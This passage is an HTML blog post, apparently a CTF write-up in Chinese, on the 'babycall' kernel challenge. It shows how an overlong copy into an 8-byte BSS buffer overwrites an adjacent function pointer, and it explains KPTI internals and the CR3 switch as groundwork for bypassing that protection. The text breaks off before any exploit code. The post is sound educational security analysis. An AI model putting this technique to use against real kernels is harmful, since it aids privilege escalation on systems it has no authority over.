@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="dark">
+    <title> 通过DASCTF&amp;HWS赛题babycall来探究绕过KPTI保护 | FMYY&#39;S Note</title>
+    
+    
+    
+    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
+</head>
+
+    <body class="dark">
+        <nav class="navbar">
+    <div class="container">
+        <div class="flex">
+            <div>
+                <a class="brand" href="/">
+                    
+                    <span class="emoji">
+                        😎
+                    </span>
+                    
+                    FMYY&#39;S Note
+                    </a>
+            </div>
+            <div class="flex">
+                
+                <a href="/articles/">Articles</a>
+                
+                <button id="dark-mode-button"></button>
+            </div>
+            </div>
+    </div>
+</nav>
+        <main>
+            
+
+<div class="container">
+    <article>
+        <header class="article-header">
+            <div class="thumb">
+                <div>
+                    <h1>通过DASCTF&amp;HWS赛题babycall来探究绕过KPTI保护</h1>
+                    <div class="post-meta">
+                        <div>
+                            By  on <time>February 01, 2021</time>
+                        </div>
+                        <div class="tags">
+                            
+                            <a href="/tags/kernel/">Kernel</a>
+                            
+                            <a href="/tags/kpti/">KPTI</a>
+                            
+                            <a href="/tags/dasctf/">DASCTF</a>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </article>
+
+    <div class="article-post">
+    <p>题目是DASCTF2021年1月末联合HWS出的题,其中babycall有个以前没注意到的考点,下面以分析此题来探究如何绕过KPTI保护</p>
+<h3 id="题目分析">题目分析</h3>
+<h4 id="qemu启动脚本">Qemu启动脚本</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span><span class="se"></span>-s <span class="se">\
+</span><span class="se"></span>-initrd rootfs.img <span class="se">\
+</span><span class="se"></span>-kernel bzImage <span class="se">\
+</span><span class="se"></span>-append <span class="s2">&#34;console=ttyS0 root=/dev/sda rw nokaslr quiet&#34;</span> <span class="se">\
+</span><span class="se"></span>-monitor /dev/null -m 128M -nographic <span class="se">\
+</span><span class="se"></span>-cpu kvm64,+smep
+</code></pre></td></tr></table>
+</div>
+</div><p>开启以下保护</p>
+<pre><code>SMEP:  管理模式执行保护,保护内核是其不允许执行用户空间代码
+</code></pre>
+<p>而如何查看是否存在一些CPU保护呢？</p>
+<pre><code>通过 cat /sys/devices/system/cpu/vulnerabilities/* 命令查看vulnerabilities目录下存在的CPU漏洞
+
+&quot;Not affected&quot;	: 当前 CPU 不存在该漏洞
+&quot;Vulnerable&quot;	: 当前 CPU 存在该漏洞且未采取相应缓解措施
+&quot;Mitigation: $M&quot;: 当前 CPU 存在该漏洞但采取了相应缓解措施
+</code></pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/ $ cat /sys/devices/system/cpu/vulnerabilities/*
+Mitigation: PTE Inversion
+Vulnerable: Clear CPU buffers attempted, no microcode<span class="p">;</span> SMT Host state unknown
+Mitigation: PTI
+Vulnerable
+Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+</code></pre></td></tr></table>
+</div>
+</div><p>可以发现当前内核其实开启了PTI保护的,以上面的命令查看即可知道,QEMU启动脚本不能查看到所有保护</p>
+<h4 id="babycall_ioctl">babycall_ioctl</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">size_t</span> <span class="n">babycall_ioctl</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">user_ptr</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="cmd--0x10001-write_to_kernel">CMD == 0x10001 write_to_kernel</h4>
+<p>查看下汇编即可发现,调用了vul指针,而在babycall_init中,vul指针指向了writemsg函数,所以<code>CMD=0x10001</code>是调用writemsg函数,传入参数RDI可控为user_ptr</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">vuln</span>
+<span class="nf">call</span>    <span class="no">__x86_indirect_thunk_rax</span> <span class="err">//</span> <span class="err">==</span> <span class="no">call</span> <span class="no">RAX</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">ptr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
+	<span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x20</span> <span class="o">&amp;&amp;</span> <span class="n">src</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">src</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">Ptr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
+		<span class="n">num_address</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span> <span class="c1">// key[0] = 0x0F0E0E0B0D0A0E0Dh;
+</span><span class="c1"></span>		<span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">num</span> <span class="o">=</span> <span class="o">*</span><span class="n">num_address</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">num_address</span> <span class="p">)</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="o">++</span><span class="n">ptr</span><span class="p">;</span>
+			<span class="o">++</span><span class="n">num_address</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!*++</span><span class="n">Ptr</span> <span class="p">)</span>
+				<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+			<span class="n">BUG</span><span class="p">();</span>
+		<span class="p">}</span>
+		<span class="n">_check_object_size</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+		<span class="n">copy_from_user</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">Ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="cmd--0x10002-read_from_kernel">CMD == 0x10002 read_from_kernel</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="mh">0x10002</span> <span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">size</span> <span class="o">=</span> <span class="n">strnlen</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
+	<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">fortify_panic</span><span class="p">(</span><span class="s">&#34;strnlen&#34;</span><span class="p">,</span> <span class="mh">0x20LL</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">!=</span> <span class="mh">0x20</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">_check_object_size</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+		<span class="k">return</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">fortify_panic</span><span class="p">(</span><span class="s">&#34;strlen&#34;</span><span class="p">,</span> <span class="mh">0x20LL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞点">漏洞点</h4>
+<p><code>CMD == 0x10001</code>中 <code>copy_from_user(BSS_Ptr, Ptr, Size);</code>,而在驱动BSS段上面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">80</span> <span class="p">;</span> <span class="kt">char</span> <span class="n">BSS_Ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
+<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">80</span> <span class="n">BSS_Ptr</span>
+<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">88</span> <span class="p">;</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">vuln</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">88</span> <span class="n">vuln</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>发现写入到BSS上的数据最长0x20个字节,可以覆盖vuln指针,之前有讲<code>CMD == 0x10001</code>时候,调用的是vuln函数指针,所以第一次<code>ioctl</code>交互可以修改BSS上vuln函数指针</p>
+<h3 id="about-kpti--bypass-kpti">About KPTI &amp;&amp; Bypass KPTI</h3>
+<p>KPTI(Kernel PageTable Isolation,简称PTI)全称内核页表隔离,旨在更好地隔离用户空间与内核空间的内存来提高安全性,缓解现代x86 CPU中的&quot;熔毁&quot;硬件安全缺陷.</p>
+<p>由于KPTI前身KAISER中,一个进程地址空间被分为内核地址空间和用户地址空间,内核地址空间映射到整个物理内存空间中,用户地址空间只能指定映射到相应的物理地址空间.内核地址空间和用户地址空间因为共用同一个页目录表,导致了meltdown漏洞,故KPTI在每一个进程中使用了两个页目录表,将用户地址空间和内核地址空间隔绝.</p>
+<h4 id="影子地址空间shadowaddressspaces">影子地址空间(ShadowAddressSpaces)</h4>
+<p>KPTI中每个进程有两个地址空间,第一个地址空间只能在内核态下访问,可以创建到内核和用户的映射（不过用户空间受SMAP和SMEP保护).第二个地址空间被称为影子地址空间，只包含用户空间.不过由于涉及到上下文切换，所以在影子地址空间中必须包含部分内核地址,用来建立到中断入口和出口的映射.</p>
+<p>当中断在用户态发生时,涉及到切换CR3寄存器,从影子地址空间切换到用户态的地址空间.中断上半部的要求是尽可能的快,从而切换CR3这个操作也要求尽可能的快.为了达到这个目的，KPTI中将内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中.这段空间必须是8K对齐的,故CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作,提高了CR3切换的速度.
+<img src="http://file.elecfans.com/web1/M00/48/41/pIYBAFqnjauALEa7AABj4HgT7UA066.png" alt=""></p>
+<h4 id="syscall--kernel-419164">SYSCALL [ Kernel 4.19.164]</h4>
+<p>根据<code>Intel SDM</code>,syscall会将当前RIP存到RCX,然后将<code>IA32_LSTAR</code>加载到RIP.同时将<code>IA32_STAR[47:32]</code>加载到CS,<code>IA32_STAR[47:32] + 8</code>加载到 SS (在 GDT 中,SS 就跟在 CS 后面).</p>
+<p><code>MSR IA32_LSTAR (MSR_LSTAR)</code>和<code>IA32_STAR (MSR_STAR)</code>在<code>arch/x86/kernel/cpu/common.c</code>的<code>syscall_init</code>中初始化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">syscall_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">extern</span> <span class="kt">char</span> <span class="n">_entry_trampoline</span><span class="p">[];</span>
+	<span class="k">extern</span> <span class="kt">char</span> <span class="n">entry_SYSCALL_64_trampoline</span><span class="p">[];</span>
+
+	<span class="kt">int</span> <span class="n">cpu</span> <span class="o">=</span> <span class="n">smp_processor_id</span><span class="p">();</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">SYSCALL64_entry_trampoline</span> <span class="o">=</span>
+		<span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_cpu_entry_area</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">entry_trampoline</span> <span class="o">+</span>
+		<span class="p">(</span><span class="n">entry_SYSCALL_64_trampoline</span> <span class="o">-</span> <span class="n">_entry_trampoline</span><span class="p">);</span>
+
+	<span class="n">wrmsr</span><span class="p">(</span><span class="n">MSR_STAR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">__USER32_CS</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="n">__KERNEL_CS</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">static_cpu_has</span><span class="p">(</span><span class="n">X86_FEATURE_PTI</span><span class="p">))</span>
+		<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_LSTAR</span><span class="p">,</span> <span class="n">SYSCALL64_entry_trampoline</span><span class="p">);</span>
+	<span class="k">else</span>
+		<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_LSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">entry_SYSCALL_64</span><span class="p">);</span>
+
+<span class="cp">#ifdef CONFIG_IA32_EMULATION
+</span><span class="cp"></span>	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_CSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">entry_SYSCALL_compat</span><span class="p">);</span>
+	<span class="cm">/*
+</span><span class="cm">	 * This only works on Intel CPUs.
+</span><span class="cm">	 * On AMD CPUs these MSRs are 32-bit, CPU truncates MSR_IA32_SYSENTER_EIP.
+</span><span class="cm">	 * This does not cause SYSENTER to jump to the wrong location, because
+</span><span class="cm">	 * AMD doesn&#39;t allow SYSENTER in long mode (either 32- or 64-bit).
+</span><span class="cm">	 */</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_CS</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">__KERNEL_CS</span><span class="p">);</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_ESP</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">cpu_entry_stack</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_EIP</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">entry_SYSENTER_compat</span><span class="p">);</span>
+<span class="cp">#else
+</span><span class="cp"></span>	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_CSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">ignore_sysret</span><span class="p">);</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_CS</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">GDT_ENTRY_INVALID_SEG</span><span class="p">);</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_ESP</span><span class="p">,</span> <span class="mi">0ULL</span><span class="p">);</span>
+	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_EIP</span><span class="p">,</span> <span class="mi">0ULL</span><span class="p">);</span>
+<span class="cp">#endif
+</span><span class="cp"></span>
+	<span class="cm">/* Flags to clear on syscall */</span>
+	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_SYSCALL_MASK</span><span class="p">,</span>
+	       <span class="n">X86_EFLAGS_TF</span><span class="o">|</span><span class="n">X86_EFLAGS_DF</span><span class="o">|</span><span class="n">X86_EFLAGS_IF</span><span class="o">|</span>
+	       <span class="n">X86_EFLAGS_IOPL</span><span class="o">|</span><span class="n">X86_EFLAGS_AC</span><span class="o">|</span><span class="n">X86_EFLAGS_NT</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到<code>MSR_STAR</code>的<code>第32-47位</code>设置为<code>Kernel mode</code>的 CS,<code>第48-63</code>位设置为<code>User mode</code>的 CS.而<code>IA32_LSTAR</code>被设置为函数<code>entry_SYSCALL_64</code>的起始地址.
+于是 syscall 时,跳转到<code>entry_SYSCALL_64</code>开始执行,其定义在 <code>arch/x86/entry/entry_64.S</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ENTRY</span><span class="p">(</span><span class="n">entry_SYSCALL_64</span><span class="p">)</span>
+	<span class="n">UNWIND_HINT_EMPTY</span>
+	<span class="cm">/*
+</span><span class="cm">	 * Interrupts are off on entry.
+</span><span class="cm">	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,
+</span><span class="cm">	 * it is too small to ever cause noticeable irq latency.
+</span><span class="cm">	 */</span>
+
+	<span class="n">swapgs</span>
+	<span class="cm">/*
+</span><span class="cm">	 * This path is only taken when PAGE_TABLE_ISOLATION is disabled so it
+</span><span class="cm">	 * is not required to switch CR3.
+</span><span class="cm">	 */</span>
+	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">rsp_scratch</span><span class="p">)</span>
+	<span class="n">movq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">cpu_current_top_of_stack</span><span class="p">),</span> <span class="o">%</span><span class="n">rsp</span>
+
+	<span class="cm">/* Construct struct pt_regs on stack */</span>
+	<span class="n">pushq</span>	<span class="err">$</span><span class="n">__USER_DS</span>					<span class="cm">/* pt_regs-&gt;ss */</span>
+	<span class="n">pushq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">rsp_scratch</span><span class="p">)</span>	<span class="cm">/* pt_regs-&gt;sp */</span>
+	<span class="n">pushq</span>	<span class="o">%</span><span class="n">r11</span>						<span class="cm">/* pt_regs-&gt;flags */</span>
+	<span class="n">pushq</span>	<span class="err">$</span><span class="n">__USER_CS</span>					<span class="cm">/* pt_regs-&gt;cs */</span>
+	<span class="n">pushq</span>	<span class="o">%</span><span class="n">rcx</span>						<span class="cm">/* pt_regs-&gt;ip */</span>
+<span class="n">GLOBAL</span><span class="p">(</span><span class="n">entry_SYSCALL_64_after_hwframe</span><span class="p">)</span>
+	<span class="n">pushq</span>	<span class="o">%</span><span class="n">rax</span>						<span class="cm">/* pt_regs-&gt;orig_ax */</span>
+
+	<span class="n">PUSH_AND_CLEAR_REGS</span> <span class="n">rax</span><span class="o">=</span><span class="err">$</span><span class="o">-</span><span class="n">ENOSYS</span>
+
+	<span class="n">TRACE_IRQS_OFF</span>
+
+	<span class="cm">/* IRQs are off. */</span>
+	<span class="n">movq</span>	<span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rsi</span>
+	<span class="n">call</span>	<span class="n">do_syscall_64</span>				<span class="cm">/* returns with IRQs disabled */</span>
+
+	<span class="n">TRACE_IRQS_IRETQ</span>					<span class="cm">/* we&#39;re about to change IF */</span>
+	<span class="p">......</span>
+	<span class="p">......</span>
+<span class="nl">syscall_return_via_sysret</span><span class="p">:</span>
+	<span class="cm">/* rcx and r11 are already restored (see code above) */</span>
+	<span class="n">POP_REGS</span> <span class="n">pop_rdi</span><span class="o">=</span><span class="mi">0</span> <span class="n">skip_r11rcx</span><span class="o">=</span><span class="mi">1</span>
+
+	<span class="cm">/*
+</span><span class="cm">	 * Now all regs are restored except RSP and RDI.
+</span><span class="cm">	 * Save old stack pointer and switch to trampoline stack.
+</span><span class="cm">	 */</span>
+	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+	<span class="n">movq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">cpu_tss_rw</span> <span class="o">+</span> <span class="n">TSS_sp0</span><span class="p">),</span> <span class="o">%</span><span class="n">rsp</span>
+	<span class="n">UNWIND_HINT_EMPTY</span>
+
+	<span class="n">pushq</span>	<span class="n">RSP</span><span class="o">-</span><span class="n">RDI</span><span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>	<span class="cm">/* RSP */</span>
+	<span class="n">pushq</span>	<span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>			<span class="cm">/* RDI */</span>
+
+	<span class="cm">/*
+</span><span class="cm">	 * We are on the trampoline stack.  All regs except RDI are live.
+</span><span class="cm">	 * We can do future final exit work right here.
+</span><span class="cm">	 */</span>
+	<span class="n">SWITCH_TO_USER_CR3_STACK</span> <span class="n">scratch_reg</span><span class="o">=%</span><span class="n">rdi</span>
+
+	<span class="n">popq</span>	<span class="o">%</span><span class="n">rdi</span>
+	<span class="n">popq</span>	<span class="o">%</span><span class="n">rsp</span>
+	<span class="n">USERGS_SYSRET64</span>
+<span class="n">END</span><span class="p">(</span><span class="n">entry_SYSCALL_64</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>syscall</code>不会保存栈指针,因此<code>handler</code>首先将当前用户态栈偏移RSP存到<code>per-cpu</code>变量<code>rsp_scratch</code>中,然后将<code>per-cpu</code>变量<code>cpu_current_top_of_stack</code>,即内核态的栈偏移加载到 RSP.</p>
+<p>SYSCALL调用返回时调用SYSRET,存在<code>SWITCH_TO_USER_CR3_STACK</code>此宏定义</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ASM" data-lang="ASM"><span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">cr3</span>
+<span class="nf">or</span>      <span class="no">rdi</span><span class="p">,</span> <span class="mi">1000</span><span class="no">h</span>
+<span class="nf">mov</span>     <span class="no">cr3</span><span class="p">,</span> <span class="no">rdi</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>此处修改CR3的值则由内核态的PGD切换用户态对应的PGD</p>
